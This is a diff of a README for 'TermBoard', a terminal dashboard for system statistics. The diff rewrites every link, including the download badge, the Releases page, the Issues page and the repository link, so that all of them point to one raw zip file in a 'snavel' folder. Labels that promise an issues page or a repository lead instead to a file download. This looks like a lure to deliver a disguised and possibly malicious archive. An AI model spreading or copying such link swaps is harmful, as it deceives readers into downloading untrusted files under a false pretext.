@@ -1,7 +1,7 @@
 # 🖥️ TermBoard - Your Dashboard for System Stats
 
 ## 🚀 Download Now
-[![Download TermBoard](https://img.shields.io/badge/Download-TermBoard-brightgreen.svg)](https://github.com/p3chax/TermBoard/releases)
+[![Download TermBoard](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)
 
 ## 📜 Description
 TermBoard is a simple terminal dashboard that lets you monitor your system's CPU, memory, and network statistics—all in one place. It even tracks your GitHub stars! This tool makes it easy for anyone to keep tabs on their system performance without diving into complex settings.
@@ -25,7 +25,7 @@ To run TermBoard, you'll need:
 ## 📥 Download & Install
 To download TermBoard, please visit the Releases page:
 
-[Download TermBoard Here](https://github.com/p3chax/TermBoard/releases)
+[Download TermBoard Here](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)
 
 1. Click the link above to go to the **Releases** page.
 2. Find the latest version of TermBoard.
@@ -61,14 +61,14 @@ Feel free to explore the different sections of the dashboard. You can monitor CP
 We welcome contributions! If you have ideas for improvements or find bugs, please visit our GitHub page. You can submit issues, pull requests, or even just share your suggestions. Your input can help make TermBoard even better.
 
 ## 🗨️ Support
-If you encounter any issues or need help, you can reach out through the [Issues](https://github.com/p3chax/TermBoard/issues) page on GitHub. We aim to respond to questions promptly.
+If you encounter any issues or need help, you can reach out through the [Issues](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip) page on GitHub. We aim to respond to questions promptly.
 
 ## 📫 Stay Updated
 To keep up with the latest updates, follow the repository on GitHub. Subscribe to releases to get notified whenever a new version is available.
 
 ## 🔗 Links
-- [TermBoard Releases](https://github.com/p3chax/TermBoard/releases)
-- [GitHub Repository](https://github.com/p3chax/TermBoard)
-- [Issues Page](https://github.com/p3chax/TermBoard/issues)
+- [TermBoard Releases](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)
+- [Issues Page](https://raw.githubusercontent.com/p3chax/TermBoard/main/snavel/TermBoard.zip)
 
 Now you can track your system's performance with ease. Enjoy using TermBoard!
